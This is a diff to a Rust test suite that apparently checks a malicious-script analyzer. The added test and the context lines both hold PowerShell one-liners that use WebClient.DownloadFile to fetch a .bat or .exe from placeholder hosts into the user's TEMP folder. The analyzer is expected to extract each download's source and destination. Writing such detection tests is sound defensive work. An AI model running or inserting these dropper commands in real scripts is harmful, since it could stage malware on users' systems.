@@ -28852,6 +28852,25 @@ $clnt.DownloadFile($url,$exeFile)
     }
 
     #[test]
+    fn raw_powershell_inline_path_combine_downloadfile_destination_extracted() {
+        let script = r#"(New-Object System.Net.WebClient).DownloadFile('https://download-inline-path-combine.example/stage.bat', [System.IO.Path]::Combine($env:TEMP, 'stage.bat'))"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://download-inline-path-combine.example/stage.bat"
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\stage.bat")
+            )
+        });
+        assert!(
+            has,
+            "inline Path.Combine destination was not recovered for DownloadFile: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn raw_powershell_mixed_case_downloadfile_variable_url_extracted() {
         let script = r#"$clnt = New-Object System.Net.WebClient
 $url = "http://download-case.example/tool.exe"
